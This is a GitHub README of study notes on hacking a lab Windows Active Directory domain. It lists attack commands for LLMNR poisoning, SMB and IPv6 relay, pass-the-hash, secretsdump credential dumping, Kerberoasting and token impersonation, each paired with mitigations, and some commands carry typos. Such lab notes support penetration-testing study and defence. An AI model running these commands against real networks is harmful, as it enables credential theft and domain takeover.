# Windows-Active-Directory-Hacking
The repo contains information on how to hack a windows active directory. REFERENCE: TCM ACADEMY
Active Directory Overview
Physical Active directory components
Logical active directory component
Requirements - One windows server(Windows 2022, two windows 10 Machines)
Setting up the Windows server,
Make sure you rename the windows server (in my case, UNCLE-DC)
promote the windows server to a domain controller by installing,  Active Directory Domain Services from the server manager, you can name your forest as anything but in my case i named it FKEYS.local
also make sure to install Active directory certificate services for other attacks that will considered for other attacks later

Attacking Active Directory: Initial Attack Vectors
1. LLMNR Poisoning (description in simple terms, what makes the attack possbible?)

Sudo responder -I eth0 -ldwPv
simulate an event occuring. on victim system- 
The hash of the victim is them capture on responder

<img width="696" height="197" alt="image" src="https://github.com/user-attachments/assets/9d0d67af-20d0-4068-b26c-d3cc71c62a3b" />

To crack the hash, run the command, 
hashcash -m 5600 hashes.txt /path/to/wordlist/ 
<img width="1877" height="390" alt="image" src="https://github.com/user-attachments/assets/da11dacb-30ec-435e-963f-008ea1ae7db7" />

LLMNR Mitigation
turn off LLMNR
if LLMNR is needed. It should have strong access control(password)

2. SMB Relay attacks
instead of capturing the hash with the responder tool, we can relay the hash via smb and gain access to a machine

Requirement for SMB relay attack to occur
smb signing disable or not enforced on the target
The relayed user credential must be an admin 

from the responder setting (/etc/responder/Responder.conf), switch off SMB and HTTP flag
then run the command Sudo responder -I eth0 -ldwPv - (what does this command do)
impacket-ntlmrelayx -tf target.txt -smb2support 
then trigger an event by pointing the attacker IP from the Victim's windows PC
<img width="802" height="473" alt="image" src="https://github.com/user-attachments/assets/5f7b7208-57e1-45fe-bdd4-6aa267a79dc0" />

SMB relay attacks mitigation
a. enable smb signing on all devices
b. disable NTLM authentication
c. account tiering
d. Local admin restriction

Different ways of gaining shell access
1. Throught metaspolit. There is a module called psexec
This is very noisy and can get picked up in live environment
<img width="1064" height="559" alt="image" src="https://github.com/user-attachments/assets/9c2df193-83b6-4d08-808d-0a5a9a93cfc6" />
Set the rhosts, SMBDomain, SMBPass, & SMBUser with the information gotten from earlier atttacks
We have gotten a shell
<img width="877" height="171" alt="image" src="https://github.com/user-attachments/assets/c0ce4592-70f3-41f4-a89e-4838116233f3" />

1b. you can also use the sam hash that was gotten from ntlmrelay.py to gain shell. Here, you are gaining shell as in administrator. To do this, You meed to set the SMBUser to administrator. you can also remove the SMBDomain that was previously set as it is not needed. we are loggin locally as in admin. Then finally set eh SMBPass withe the admin sam hashes
<img width="917" height="201" alt="image" src="https://github.com/user-attachments/assets/781b0459-7d41-409b-a135-9d77cc64f8a3" />



2. The use of psexec.py tool
   psexec.py DOMAIN/user:@ip-address
<img width="577" height="262" alt="image" src="https://github.com/user-attachments/assets/378a98e9-2e49-4356-b36b-85bbf91b355a" />

<img width="1004" height="255" alt="image" src="https://github.com/user-attachments/assets/d8bb87ce-031d-4c61-900b-93febda1acb3" />

3. IPV6 Attacks (DNS takeover Via IPV6)
 a simple yet broad overview of what the attack is about

set up attacker machine ---- then listen for IPV6 messages-(spoofing) ----
when this happen, authrnication can be gotten to the DOmaain control via ldap or SMB

tools used - mitm6, ntlmrelayx
command - mitm6 -d fkeys.local(what does the command do)
before you run the previous command, run this command on your other terminal:

   ntlmrelayx.py -6 -t ldaps://IP_address_of_DC -wh anything.fkeys.local -l lootbox (explain what the command does.)
Then we wait for an event to happen. but for simulation purpose, we can trigger a restart event from the machine on the network. as soon as we restart the a machine on the network, 
ntlmrelayx captures it.
<img width="629" height="93" alt="image" src="https://github.com/user-attachments/assets/485e615d-17d3-4e3d-a86a-505294d81e7a" />
On navigating to "lootbox" folder created, we get alot more information. This is possible because of ldapdomain dump
<img width="1071" height="380" alt="image" src="https://github.com/user-attachments/assets/be47416c-929a-4f16-bf71-11ae86868a9e" />

But to take things further, if a domain admin user logins, ntlmrelayx will also capture it. 
<img width="647" height="389" alt="image" src="https://github.com/user-attachments/assets/943f410c-e694-4859-a094-97b03d4f101a" />
ntlmrelayx then creates a new user. 

Mitigation strategies for IPV6 attacks
IPv6 poisoning abuses the fact that Windows queries for an IPv6 address even in IPv4-only environments. If you do not use IPv6 internally, the safest way to prevent mitm6 is to block DHCPv6 traffic and incoming router advertisements in Windows Firewall via Group Policy. Disabling IPv6 entirely may have unwanted side effects. Setting the following predefined rules to Block instead of Allow prevents the attack from working:
(Inbound) Core Networking - Dynamic Host Configuration Protocol for IPv6(DHCPV6-In)
• (Inbound) Core Networking - Router Advertisement (ICMPv6-In)
(Outbound) Core Networking - Dynamic Host Configuration
Protocol for IPv6(DHCPV6- Out)
If WAD is not in use internally, disable it via Group Policy and by disabling the WinHttpAutoProxySvc service.
Relaying to LDAP and LDAPS can only be mitigated by enabling both LDAP signing and LDAP channel binding.
Consider Administrative users to the Protected Users group or marking them as Account is sensitive and cannot be delegated, which will prevent any impersonation of that user via delegation.

4. Passback attacks

POST-COMPROMISE ACTIVE DIRECTORY ENUMERATION(WHAT HAPPENS AFTER GETTING A VALID ACCOUNT)
we enumeratee

A. Domain Enumeration with ldapdomaindump
   <img width="808" height="276" alt="image" src="https://github.com/user-attachments/assets/f0f4b791-de66-4f0c-a59a-4b1aaceb7e10" />
command: ldapdomaindump ldaps://ip_addresof_DC -u 'Domanin\User' -p 'passwd'
B. Domain Enumneration with Bloodhound
to run an injester i.e so that we will be able to use the output and load it up on the bloodhound application, you can use the command:
   bloodhound-python -d <domain> -u <user> -p <password> -ns <ip_addres_of_DC> -c all 
   <img width="719" height="345" alt="image" src="https://github.com/user-attachments/assets/f71c1910-d78a-463b-b9c2-3fdb22b8b543" />
   <img width="691" height="88" alt="image" src="https://github.com/user-attachments/assets/6d3794d4-daa1-4d21-b394-6e1292869af9" />
 we can upload the json files into bloodhound for a more interactive analysis
    <img width="1906" height="889" alt="image" src="https://github.com/user-attachments/assets/9d1d6714-08d0-43c1-bcf6-d5538269c77c" />


C. Domain Enumeration with Plumhound
same as other enumeration tools
you can run the command 
   PlumHound.py --easy -p <passwd_of_neo4j>
   this command is used to test database connectiuon, it also returns Domain users to stdout
   <img width="691" height="543" alt="image" src="https://github.com/user-attachments/assets/8baa0222-d9e7-47b0-a1e6-9d3a6d069a85" />

PlumHound.py -x tasks/default.tasks -p neo4j1(what it does)


   <img width="1626" height="966" alt="Screenshot 2025-09-21 205422" src="https://github.com/user-attachments/assets/074e266f-39bb-4f8a-ad39-b5c98cc11fa2" /> 
     
D. Domain Enumeration with Pingcastle


POST COMPROMISE ATTACKS(here, we already have a valid account, what can we do with that ?
a. pass the password/ pass the hash attack(pass attacks)
if we crack a password and/or dump the SAM hashes, we can leverage both for lateral movemnt in networks
tool used - crackmapexec 
cmd- crackmapexec smb <ip/CIDR> -u <user> -d <domain> -p <password>
   <img width="1334" height="118" alt="image" src="https://github.com/user-attachments/assets/77fa776b-f988-44cd-bd32-0c11108db56d" />

we can also use hashes(NTLMv1). this is what is refered to as pass the the hash attack
cmd - crackmapexec -smb <ip/CIDR> -u administrator -H <ntlm_hash> --local-auth

   <img width="1345" height="138" alt="image" src="https://github.com/user-attachments/assets/c24d7d97-72a4-43b7-a94d-0b8a77fc5945" />
You actually do not need to crack the hash, just pass it around

you can also do --sam flag to dump the sam hashes.

   <img width="1266" height="343" alt="image" src="https://github.com/user-attachments/assets/fa252dbe-ceb8-435d-8603-77380db3c703" />


you can also do --shares to enumerate shares permissions.

   <img width="1249" height="335" alt="image" src="https://github.com/user-attachments/assets/ebf6b291-1c53-40f3-8005-037e9aa229ef" />


crackmapexec smb -L

<img width="1540" height="593" alt="image" src="https://github.com/user-attachments/assets/820248c6-d5ed-4b2a-a7e5-6bb541ca1ed1" />


DUMPING and CRACKING HASHES
this can be achieved with the use of secretsdump
cmd: impacket-secretsdump <domain>\<user>:'Password'@<ip-address>
   <img width="1211" height="632" alt="image" src="https://github.com/user-attachments/assets/9328fd5b-74ac-47b9-b3db-a9ff50eb7791" />

   this tool can dump alot of information. sam hashes, lsa, DCC2, LSA Secrets, ability to see password in cleartext,wdigest.( 

you also use hashes with secretsdumps command
cmd: impacket-secretdump administrator:@<ip_address> -hashes shjdfjhjsdfjksf

   <img width="1153" height="634" alt="image" src="https://github.com/user-attachments/assets/b98a3497-4503-454d-a095-a7688b4347f6" />

so imagine we have llmnr -> get user hash -> cracked hashes -> spray the password -> found new login -> secretdump the logins - > local admin hashes - > respray the network with local accounts

you can also crack hashes. You need NT portion of the hash when you wanna crack the hash. 

Pass the hash / Pass the password Mitigation
 Limit account re-use:
• Avoid re-using local admin password
• Disable Guest and Administrator accounts
• Limit who is a local administrator (least privilege)
• Utilize strong passwords:
• The longer the better (>14 characters)
• Avoid using common words
• I like long sentences
• Privilege Access Management (PAM):
• Check out/in sensitive accounts when needed
• Automatically rotate passwords on check out and check
• Limits pass attacks as hash/password is strong and constantly rotated

b. Kerberoasting attacks
This attack takes advantage of service accounts(explain better)
   <img width="962" height="668" alt="image" src="https://github.com/user-attachments/assets/2245384c-ca81-4237-a8b7-64bc1082709a" />
Tool used: GetuserSPNS
cmd: impacket-GetUserSPNs FKEYS.local/bjames:Password! -dc-ip 192.168.182.139 -request
the command above requests for a ticket granting ticket(tgt). Just think of it this way, if you have if a compromised domain credential, you can request for a ticket granting ticket
   <img width="895" height="374" alt="image" src="https://github.com/user-attachments/assets/ccb90c8e-47b1-4f5e-8e06-12909809244c" />

we can the crack the ticket using hashcat
hashcat -m 13100 krb.txt /usr/share/wordlists/rockyou.txt

mitigation strategies for kerberoasting attacks
1. Strong Passwords
2. Least privilege

c. Token Impersonation attacks
What are tokens?

• Temporary keys that allow you access to a system/network without having to provide credentials each time you access a file.
Think cookies for computers.
Two types:

• Delegate - Created for logging into a machine or using Remote Desktop
• Impersonate - "non-interactive" such as attaching a network drive or a domain logon script

To perform the Token impersonation attack, we can make use of metasploit
first, we gain a shell (meterpreter shell), from the compromised credentials.
after we gain the meterpreter shell, we then load up the incognito extension. 
   <img width="894" height="205" alt="image" src="https://github.com/user-attachments/assets/f7a75f5e-ae70-4aed-89a8-3ae89d62f7a8" />

we can list tokens with the command: list_tokens -u

   <img width="474" height="182" alt="image" src="https://github.com/user-attachments/assets/0997b78d-99ed-4c5c-8373-f01d4aca3499" />

To impersonate the user or accoount we see when we run the list_token command,
we can run the command: impersonate_token domain\\user
   <img width="380" height="52" alt="image" src="https://github.com/user-attachments/assets/41cc23c5-091b-44a8-a661-0c2e31613e39" />
   Now, we have successfully impersonated the user

if an admin user also logins into the machine we impersonated,  we will also be able to impersonate the admin user

   <img width="473" height="504" alt="image" src="https://github.com/user-attachments/assets/517c02fd-fb38-47d5-91c4-64c94315c96a" />
   Here we have successfully impersonate the admin

we can take it a step further to add a new user into the domain admin group as seen in the picture below:

   <img width="684" height="206" alt="image" src="https://github.com/user-attachments/assets/abc32356-8326-41e7-aed7-cc93b42f4fd5" />

Token Impersonation mitigation strategies
a. limit user/group token creation
b. account tiering
c. local admin restriction

d. LNK File Attacks
LNK file attacks involve the malicious use of Windows shortcut files to execute harmful commands or deliver payloads when opened by a user.

say for example we have access to a file share. we can dump a malicious file into it. 

   <img width="640" height="145" alt="image" src="https://github.com/user-attachments/assets/9fa40aa7-7edd-41ad-a8f2-7372db5a9767" />
if the file created gets dumped into the file share and a user visits, we can capture the user hash


   








